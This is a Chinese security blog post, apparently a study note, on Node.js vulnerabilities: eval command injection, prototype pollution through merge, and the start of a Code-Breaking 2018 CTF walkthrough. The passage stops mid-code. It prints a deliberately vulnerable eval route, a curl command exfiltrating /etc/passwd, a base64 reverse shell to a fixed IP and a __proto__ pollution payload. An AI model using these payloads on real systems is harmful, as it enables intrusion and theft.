@@ -1,0 +1,1078 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言Nodejs常见漏洞学习和总结，并且方便以后扩展。 0x01 危险的函数所导致的命令执行eval()eval()函数可计算某个字符串，并执行其中的javascript代码。和PHP中的eval函数一样，如果传入到函数中的参数可控并且没有经过严格的过滤时，就会导致漏洞的出现。简单的例子：main.js1234567891011const express=require(&quot;express&quot;);co">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Node.js常见漏洞学习与总结">
+<meta property="og:url" content="http://yoursite.com/2020/03/14/Node-js常见漏洞学习与总结/index.html">
+<meta property="og:site_name" content="L&#39;s Blog">
+<meta property="og:description" content="前言Nodejs常见漏洞学习和总结，并且方便以后扩展。 0x01 危险的函数所导致的命令执行eval()eval()函数可计算某个字符串，并执行其中的javascript代码。和PHP中的eval函数一样，如果传入到函数中的参数可控并且没有经过严格的过滤时，就会导致漏洞的出现。简单的例子：main.js1234567891011const express=require(&quot;express&quot;);co">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-2-27-nodejs-1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-2-27-nodejs-2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-2-27-nodejs-3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-2-27-nodejs-4.png">
+<meta property="og:updated_time" content="2020-03-14T06:28:43.640Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Node.js常见漏洞学习与总结">
+<meta name="twitter:description" content="前言Nodejs常见漏洞学习和总结，并且方便以后扩展。 0x01 危险的函数所导致的命令执行eval()eval()函数可计算某个字符串，并执行其中的javascript代码。和PHP中的eval函数一样，如果传入到函数中的参数可控并且没有经过严格的过滤时，就会导致漏洞的出现。简单的例子：main.js1234567891011const express=require(&quot;express&quot;);co">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-2-27-nodejs-1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/03/14/Node-js常见漏洞学习与总结/">
+
+
+
+
+
+  <title>Node.js常见漏洞学习与总结 | L's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">L's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">share with you</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/14/Node-js常见漏洞学习与总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ljdd520">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="L's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Node.js常见漏洞学习与总结</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-14T14:27:08+08:00">
+                2020-03-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/nodejs-web/" itemprop="url" rel="index">
+                    <span itemprop="name">nodejs-web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  6.9k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  32
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Nodejs常见漏洞学习和总结，并且方便以后扩展。</p>
+<h4 id="0x01-危险的函数所导致的命令执行"><a href="#0x01-危险的函数所导致的命令执行" class="headerlink" title="0x01 危险的函数所导致的命令执行"></a>0x01 危险的函数所导致的命令执行</h4><h5 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h5><h6 id="eval-函数可计算某个字符串，并执行其中的javascript代码。和PHP中的eval函数一样，如果传入到函数中的参数可控并且没有经过严格的过滤时，就会导致漏洞的出现。"><a href="#eval-函数可计算某个字符串，并执行其中的javascript代码。和PHP中的eval函数一样，如果传入到函数中的参数可控并且没有经过严格的过滤时，就会导致漏洞的出现。" class="headerlink" title="eval()函数可计算某个字符串，并执行其中的javascript代码。和PHP中的eval函数一样，如果传入到函数中的参数可控并且没有经过严格的过滤时，就会导致漏洞的出现。"></a>eval()函数可计算某个字符串，并执行其中的javascript代码。和PHP中的eval函数一样，如果传入到函数中的参数可控并且没有经过严格的过滤时，就会导致漏洞的出现。</h6><h6 id="简单的例子："><a href="#简单的例子：" class="headerlink" title="简单的例子："></a>简单的例子：</h6><h6 id="main-js"><a href="#main-js" class="headerlink" title="main.js"></a>main.js</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express=<span class="built_in">require</span>(<span class="string">"express"</span>);</span><br><span class="line"><span class="keyword">const</span> app=express();</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/eval'</span>,<span class="function"><span class="keyword">function</span> (<span class="params">req,res</span>) </span>&#123;</span><br><span class="line">    res.send(<span class="built_in">eval</span>(req.query.q));</span><br><span class="line">    <span class="built_in">console</span>.log(req.query.q);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> server=app.listen(<span class="number">8888</span>,<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">   <span class="built_in">console</span>.log(<span class="string">`Server listening on port 8888!`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<h5 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h5><h6 id="Nodejs中的chile-process-exec调用的是-bash-sh，它是一个bash解释器，可以执行系统命令。在eval函数的参数中可以构造require-39-child-process-39-exec-39-39-来进行调用。"><a href="#Nodejs中的chile-process-exec调用的是-bash-sh，它是一个bash解释器，可以执行系统命令。在eval函数的参数中可以构造require-39-child-process-39-exec-39-39-来进行调用。" class="headerlink" title="Nodejs中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令。在eval函数的参数中可以构造require(&#39;child_process&#39;).exec(&#39;&#39;);来进行调用。"></a>Nodejs中的<code>chile_process.exec</code>调用的是<code>/bash.sh</code>，它是一个<code>bash</code>解释器，可以执行系统命令。在eval函数的参数中可以构造<code>require(&#39;child_process&#39;).exec(&#39;&#39;);</code>来进行调用。</h6><h6 id="弹计算器-windows"><a href="#弹计算器-windows" class="headerlink" title="弹计算器(windows):"></a>弹计算器(windows):</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/eval?q=require(&apos;child_process&apos;).exec(&apos;calc&apos;);</span><br></pre></td></tr></table></figure>
+
+<h6 id="读取文件-linux"><a href="#读取文件-linux" class="headerlink" title="读取文件(linux):"></a>读取文件(linux):</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/eval?q=require(&apos;child_process&apos;).exec(&apos;curl -F &quot;x=`cat /etc/passwd`&quot; http://vps&apos;);</span><br></pre></td></tr></table></figure>
+
+<h6 id="反弹shell-linux"><a href="#反弹shell-linux" class="headerlink" title="反弹shell(linux):"></a>反弹shell(linux):</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/eval?q=require(&apos;child_process&apos;).exec(&apos;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjMuNTcuMjMyLjY5LzU0NzggMD4mMQog|base64 -d|bash&apos;);</span><br><span class="line"></span><br><span class="line">YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjMuNTcuMjMyLjY5LzU0NzggMD4mMQog是bash -i &gt;&amp; /dev/tcp/123.57.232.69/5478 0&gt;&amp;1 BASE64加密后的结果，直接调用会报错。</span><br><span class="line"></span><br><span class="line">注意：BASE64加密后的字符中有一个+号需要url编码为%2B(一定情况下)</span><br></pre></td></tr></table></figure>
+
+<h6 id="如果上下文中没有require-类似于Code-Breaking-2018-Thejs-，则可以使用global-process-mainModule-constructor-load-39-child-process-39-exec-39-calc-39-来执行命令。"><a href="#如果上下文中没有require-类似于Code-Breaking-2018-Thejs-，则可以使用global-process-mainModule-constructor-load-39-child-process-39-exec-39-calc-39-来执行命令。" class="headerlink" title="如果上下文中没有require(类似于Code-Breaking 2018 Thejs)，则可以使用global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;calc&#39;)来执行命令。"></a>如果上下文中没有require(类似于Code-Breaking 2018 Thejs)，则可以使用<code>global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;calc&#39;)</code>来执行命令。</h6><h6 id="paypal一个命令执行的例子："><a href="#paypal一个命令执行的例子：" class="headerlink" title="paypal一个命令执行的例子："></a>paypal一个命令执行的例子：</h6><h6 id="demo-paypal-com-Node-js-code-injection-RCE"><a href="#demo-paypal-com-Node-js-code-injection-RCE" class="headerlink" title="[demo.paypal.com] Node.js code injection (RCE)"></a><a href="https://artsploit.blogspot.com/2016/08/pprce2.html" target="_blank" rel="noopener">[demo.paypal.com] Node.js code injection (RCE)</a></h6><h6 id="使用数组绕过过滤，再调用child-process执行命令"><a href="#使用数组绕过过滤，再调用child-process执行命令" class="headerlink" title="(使用数组绕过过滤，再调用child_process执行命令)"></a>(使用数组绕过过滤，再调用child_process执行命令)</h6><h5 id="类似命令"><a href="#类似命令" class="headerlink" title="类似命令"></a>类似命令</h5><h6 id="间隔两秒执行函数："><a href="#间隔两秒执行函数：" class="headerlink" title="间隔两秒执行函数："></a>间隔两秒执行函数：</h6><ul>
+<li><code>setInteval(some_function, 2000)</code><h6 id="两秒后执行函数："><a href="#两秒后执行函数：" class="headerlink" title="两秒后执行函数："></a>两秒后执行函数：</h6></li>
+<li><code>setTimeout(some_function, 2000)</code></li>
+</ul>
+<h6 id="some-function处就类似于eval函数的参数"><a href="#some-function处就类似于eval函数的参数" class="headerlink" title="some_function处就类似于eval函数的参数"></a><code>some_function</code>处就类似于eval函数的参数</h6><h6 id="还有使用函数的原生对象，例如输出Hello-world。"><a href="#还有使用函数的原生对象，例如输出Hello-world。" class="headerlink" title="还有使用函数的原生对象，例如输出Hello world。"></a>还有使用函数的原生对象，例如输出<code>Hello world</code>。</h6><ul>
+<li><code>Function(&quot;console.log(&#39;Hello world&#39;)&quot;)();</code><h6 id="类似于php中的create-function。"><a href="#类似于php中的create-function。" class="headerlink" title="类似于php中的create_function。"></a>类似于<code>php</code>中的<code>create_function</code>。</h6><h6 id="以上都可以导致命令执行"><a href="#以上都可以导致命令执行" class="headerlink" title="以上都可以导致命令执行"></a>以上都可以导致命令执行</h6></li>
+</ul>
+<h4 id="0x02-Nodejs原型链污染漏洞"><a href="#0x02-Nodejs原型链污染漏洞" class="headerlink" title="0x02 Nodejs原型链污染漏洞"></a>0x02 Nodejs原型链污染漏洞</h4><h6 id="javascript原型链参考文章：继承与原型链"><a href="#javascript原型链参考文章：继承与原型链" class="headerlink" title="javascript原型链参考文章：继承与原型链"></a>javascript原型链参考文章：<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain" target="_blank" rel="noopener">继承与原型链</a></h6><h6 id="文章内关于原型和原型链的知识写的非常详细，就不再总结整个过程了，以下为几个比较重要的点："><a href="#文章内关于原型和原型链的知识写的非常详细，就不再总结整个过程了，以下为几个比较重要的点：" class="headerlink" title="文章内关于原型和原型链的知识写的非常详细，就不再总结整个过程了，以下为几个比较重要的点："></a>文章内关于原型和原型链的知识写的非常详细，就不再总结整个过程了，以下为几个比较重要的点：</h6><ul>
+<li>在javascript中，每一个实例对象都有一个prototype属性，prototype属性可以向对象添加属性和方法。</li>
+</ul>
+<h6 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object.prototype.name=value</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>在JavaScript中，每一个实例对象都有一个<code>__proto__</code>属性，这个实例属性指向对象的原型对象(即原型)。可以通过以下方式访问得到某一实例对象的原型对象：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">objectname[&quot;__proto__&quot;]</span><br><span class="line">objectname.__proto__</span><br><span class="line">objectname.constructor.prototype</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>不同对象所生成的原型链如下(部分)：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> o = &#123;<span class="attr">a</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="comment">// o对象直接继承了Object.prototype</span></span><br><span class="line"><span class="comment">// 原型链：</span></span><br><span class="line"><span class="comment">// o ---&gt; Object.prototype ---&gt; null</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> a = [<span class="string">"yo"</span>, <span class="string">"whadup"</span>, <span class="string">"?"</span>];</span><br><span class="line"><span class="comment">// 数组都继承于 Array.prototype</span></span><br><span class="line"><span class="comment">// 原型链：</span></span><br><span class="line"><span class="comment">// a ---&gt; Array.prototype ---&gt; Object.prototype ---&gt; null</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 函数都继承于 Function.prototype</span></span><br><span class="line"><span class="comment">// 原型链：</span></span><br><span class="line"><span class="comment">// f ---&gt; Function.prototype ---&gt; Object.prototype ---&gt; null</span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h5 id="原型链污染原理"><a href="#原型链污染原理" class="headerlink" title="原型链污染原理"></a>原型链污染原理</h5><h6 id="对于语句：object-a-b-value如果可以控制a、b、value的值，将a设置为proto，我们就可以给object对象的原型设置一个b属性，值为value。这样所有继承object对象原型的实例对象在本身不拥有b属性的情况下，都会拥有b属性，且值为value。"><a href="#对于语句：object-a-b-value如果可以控制a、b、value的值，将a设置为proto，我们就可以给object对象的原型设置一个b属性，值为value。这样所有继承object对象原型的实例对象在本身不拥有b属性的情况下，都会拥有b属性，且值为value。" class="headerlink" title="对于语句：object[a][b] = value如果可以控制a、b、value的值，将a设置为proto，我们就可以给object对象的原型设置一个b属性，值为value。这样所有继承object对象原型的实例对象在本身不拥有b属性的情况下，都会拥有b属性，且值为value。"></a>对于语句：<code>object[a][b] = value</code>如果可以控制a、b、value的值，将a设置为<strong>proto</strong>，我们就可以给object对象的原型设置一个b属性，值为value。这样所有继承object对象原型的实例对象在本身不拥有b属性的情况下，都会拥有b属性，且值为value。</h6><h6 id="例子：-1"><a href="#例子：-1" class="headerlink" title="例子："></a>例子：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">object1 = &#123;<span class="string">"a"</span>:<span class="number">1</span>, <span class="string">"b"</span>:<span class="number">2</span>&#125;;</span><br><span class="line">object1.__proto__.foo = <span class="string">"Hello World"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(object1.foo);</span><br><span class="line">object2 = &#123;<span class="string">"c"</span>:<span class="number">1</span>, <span class="string">"d"</span>:<span class="number">2</span>&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(object2.foo);</span><br></pre></td></tr></table></figure>
+
+<h6 id="结果如下："><a href="#结果如下：" class="headerlink" title="结果如下："></a>结果如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello World</span><br><span class="line">Hello World</span><br></pre></td></tr></table></figure>
+
+<h6 id="最终会输出两个Hello-World。为什么object2在没有设置foo属性的情况下，也会输出Hello-World呢？就是因为在第二条语句中，我们对object1的原型对象设置了一个foo属性，而object2和object1一样，都是继承了Object-prototype。在获取object2-foo时，由于object2本身不存在foo属性，就会往父类Object-prototype中去寻找。这就造成了一个原型链污染，所以原型链污染简单来说就是如果能够控制并修改一个对象的原型，就可以影响到所有和这个对象同一个原型的对象。"><a href="#最终会输出两个Hello-World。为什么object2在没有设置foo属性的情况下，也会输出Hello-World呢？就是因为在第二条语句中，我们对object1的原型对象设置了一个foo属性，而object2和object1一样，都是继承了Object-prototype。在获取object2-foo时，由于object2本身不存在foo属性，就会往父类Object-prototype中去寻找。这就造成了一个原型链污染，所以原型链污染简单来说就是如果能够控制并修改一个对象的原型，就可以影响到所有和这个对象同一个原型的对象。" class="headerlink" title="最终会输出两个Hello World。为什么object2在没有设置foo属性的情况下，也会输出Hello World呢？就是因为在第二条语句中，我们对object1的原型对象设置了一个foo属性，而object2和object1一样，都是继承了Object.prototype。在获取object2.foo时，由于object2本身不存在foo属性，就会往父类Object.prototype中去寻找。这就造成了一个原型链污染，所以原型链污染简单来说就是如果能够控制并修改一个对象的原型，就可以影响到所有和这个对象同一个原型的对象。"></a>最终会输出两个Hello World。为什么object2在没有设置foo属性的情况下，也会输出Hello World呢？就是因为在第二条语句中，我们对object1的原型对象设置了一个foo属性，而object2和object1一样，都是继承了Object.prototype。在获取object2.foo时，由于object2本身不存在foo属性，就会往父类Object.prototype中去寻找。这就造成了一个原型链污染，所以原型链污染简单来说就是如果能够控制并修改一个对象的原型，就可以影响到所有和这个对象同一个原型的对象。</h6><h5 id="merge操作导致原型链的污染"><a href="#merge操作导致原型链的污染" class="headerlink" title="merge操作导致原型链的污染"></a>merge操作导致原型链的污染</h5><h6 id="merge操作是最常见可能控制键名的操作，也最能被原型链攻击。"><a href="#merge操作是最常见可能控制键名的操作，也最能被原型链攻击。" class="headerlink" title="merge操作是最常见可能控制键名的操作，也最能被原型链攻击。"></a>merge操作是最常见可能控制键名的操作，也最能被原型链攻击。</h6><ul>
+<li>例子：<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">target,source</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source)&#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target)&#123;</span><br><span class="line">            merge(target[key],source[key]);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            target[key]=source[key];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> object1 = &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> object2 = <span class="built_in">JSON</span>.parse(<span class="string">'&#123;"a": 1, "__proto__": &#123;"b": 2&#125;&#125;'</span>);</span><br><span class="line">merge(object1, object2);</span><br><span class="line"><span class="built_in">console</span>.log(object1.a, object1.b);</span><br><span class="line"></span><br><span class="line">object3 = &#123;&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(object3.b);</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h6 id="需要注意的点是："><a href="#需要注意的点是：" class="headerlink" title="需要注意的点是："></a>需要注意的点是：</h6><h6 id="在JSON解析的情况下，-proto-会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历object2的时候会存在这个键。"><a href="#在JSON解析的情况下，-proto-会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历object2的时候会存在这个键。" class="headerlink" title="在JSON解析的情况下，__proto__会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历object2的时候会存在这个键。"></a>在JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历object2的时候会存在这个键。</h6><h6 id="结果如下：-1"><a href="#结果如下：-1" class="headerlink" title="结果如下："></a>结果如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 2</span><br><span class="line">2</span><br></pre></td></tr></table></figure>
+
+<h6 id="可见object3的b是从原型中获取到的，说明Object已经被污染了。"><a href="#可见object3的b是从原型中获取到的，说明Object已经被污染了。" class="headerlink" title="可见object3的b是从原型中获取到的，说明Object已经被污染了。"></a>可见object3的b是从原型中获取到的，说明Object已经被污染了。</h6><h5 id="Code-Breaking-2018-Thejs"><a href="#Code-Breaking-2018-Thejs" class="headerlink" title="Code-Breaking 2018 Thejs"></a>Code-Breaking 2018 Thejs</h5><h6 id="这个题目已经有很多的分析文章了，但因为它是一个比较好的学习原型链污染的题目，还是值得自己再过一遍。"><a href="#这个题目已经有很多的分析文章了，但因为它是一个比较好的学习原型链污染的题目，还是值得自己再过一遍。" class="headerlink" title="这个题目已经有很多的分析文章了，但因为它是一个比较好的学习原型链污染的题目，还是值得自己再过一遍。"></a>这个题目已经有很多的分析文章了，但因为它是一个比较好的学习原型链污染的题目，还是值得自己再过一遍。</h6><h6 id="题目源码下载：http-code-breaking-com-puzzle-9"><a href="#题目源码下载：http-code-breaking-com-puzzle-9" class="headerlink" title="题目源码下载：http://code-breaking.com/puzzle/9/"></a>题目源码下载：<a href="http://code-breaking.com/puzzle/9/" target="_blank" rel="noopener">http://code-breaking.com/puzzle/9/</a></h6><h6 id="直接npm-install可以把需要的模块下下来。"><a href="#直接npm-install可以把需要的模块下下来。" class="headerlink" title="直接npm install可以把需要的模块下下来。"></a>直接<code>npm install</code>可以把需要的模块下下来。</h6><h6 id="server-js"><a href="#server-js" class="headerlink" title="server.js"></a>server.js</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>)</span><br><span class="line"><span class="keyword">const</span> lodash = <span class="built_in">require</span>(<span class="string">'lodash'</span>)</span><br><span 